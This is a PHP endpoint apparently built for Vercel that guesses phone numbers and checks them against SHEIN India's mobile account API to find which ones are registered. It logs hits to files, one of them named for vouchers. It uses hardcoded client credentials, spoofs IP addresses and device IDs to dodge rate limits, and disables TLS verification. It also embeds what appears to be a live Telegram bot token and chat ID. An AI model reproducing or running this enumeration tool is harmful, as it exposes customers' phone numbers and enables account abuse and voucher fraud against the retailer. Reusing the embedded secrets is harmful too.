<?php
// api/check.php - For Vercel deployment

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers for JSON response
header('Content-Type: application/json');

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed. Use POST.']);
    exit;
}

// Get input from request body
$input = json_decode(file_get_contents('php://input'), true);
$baseNumber = $input['number'] ?? '';

if (empty($baseNumber)) {
    echo json_encode(['error' => 'Please provide a number']);
    exit;
}

// Your existing configuration
define('TELEGRAM_BOT_TOKEN', '8479991961:AAEWken8DazbjTaiN_DAGwTuY3Gq0-tb1c');
define('TELEGRAM_CHAT_ID', '1366899854');

// Create a temporary directory for files (Vercel has read-only filesystem except /tmp)
$tmpDir = '/tmp/shein_checker';
if (!file_exists($tmpDir)) {
    mkdir($tmpDir, 0777, true);
}

// Override file paths to use /tmp
$checkedNumbersFile = $tmpDir . '/checked_numbers.json';
$registeredNumbersFile = $tmpDir . '/registered_numbers.txt';
$voucherNumbersFile = $tmpDir . '/voucher_numbers.txt';
$allResultsFile = $tmpDir . '/all_results.json';

// Load previously checked numbers
$checkedNumbers = [];
if (file_exists($checkedNumbersFile)) {
    $checkedNumbers = json_decode(file_get_contents($checkedNumbersFile), true) ?: [];
}

// Function to generate complete number
function generateCompleteNumber($input) {
    $input = preg_replace('/[^0-9]/', '', $input);
    $inputLength = strlen($input);
    
    if ($inputLength >= 10) {
        return $input;
    }
    
    $digitsNeeded = 10 - $inputLength;
    $randomDigits = '';
    for ($i = 0; $i < $digitsNeeded; $i++) {
        $randomDigits .= rand(0, 9);
    }
    
    return $input . $randomDigits;
}

// Function to make HTTP calls
function httpCall($url, $data = null, $headers = [], $method = "GET") {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => 'gzip',
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 30
    ]);
    
    if (strtoupper($method) === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'content' => $output,
        'http_code' => $httpCode
    ];
}

// Generate random IP
function randIp() { 
    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
}

// Generate device ID
function genDeviceId() { 
    return bin2hex(random_bytes(8)); 
}

// Generate a unique number not checked before
$maxAttempts = 50;
$attempts = 0;
$completeNumber = '';

do {
    $completeNumber = generateCompleteNumber($baseNumber);
    $attempts++;
    if ($attempts > $maxAttempts) {
        echo json_encode(['error' => 'Could not generate unique number']);
        exit;
    }
} while (isset($checkedNumbers[$completeNumber]));

// Get access token first
$ip = randIp();
$adId = genDeviceId();
$url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
$headers = [
    "Client_type: Android/29",
    "Accept: application/json",
    "Client_version: 1.0.8",
    "User-Agent: Android",
    "X-Tenant-Id: SHEIN",
    "Ad_id: $adId",
    "X-Tenant: B2C",
    "Content-Type: application/x-www-form-urlencoded",
    "X-Forwarded-For: $ip"
];

$data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
$response = httpCall($url, $data, $headers, "POST");
$j = json_decode($response['content'], true);
$access_token = $j['access_token'] ?? null;

if (!$access_token) {
    echo json_encode(['error' => 'Failed to obtain access token']);
    exit;
}

// Check account
$ip = randIp();
$adId = genDeviceId();
$url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
$headers = [
    "Authorization: Bearer $access_token",
    "Requestid: account_check",
    "X-Tenant: B2C",
    "Accept: application/json",
    "User-Agent: Android",
    "Client_type: Android/29",
    "Client_version: 1.0.8",
    "X-Tenant-Id: SHEIN",
    "Ad_id: $adId",
    "Content-Type: application/x-www-form-urlencoded",
    "X-Forwarded-For: $ip"
];

$response = httpCall($url, "mobileNumber=$completeNumber", $headers, "POST");
$result = json_decode($response['content'], true);

// Save checked number
$checkedNumbers[$completeNumber] = time();
file_put_contents($checkedNumbersFile, json_encode($checkedNumbers, JSON_PRETTY_PRINT));

// Prepare response
$output = [
    'number' => $completeNumber,
    'status' => 'unknown',
    'timestamp' => date('Y-m-d H:i:s')
];

if (isset($result['success']) && $result['success'] === false) {
    $output['status'] = 'not_registered';
} elseif (isset($result['encryptedId'])) {
    $output['status'] = 'registered';
    $output['encryptedId'] = $result['encryptedId'];
    
    // Save registered number
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Number: $completeNumber | EncryptedID: {$result['encryptedId']}\n";
    file_put_contents($registeredNumbersFile, $entry, FILE_APPEND | LOCK_EX);
    
    // Here you could continue with token generation if needed
    // But Vercel has a 10-second timeout limit
}

echo json_encode($output, JSON_PRETTY_PRINT);
?>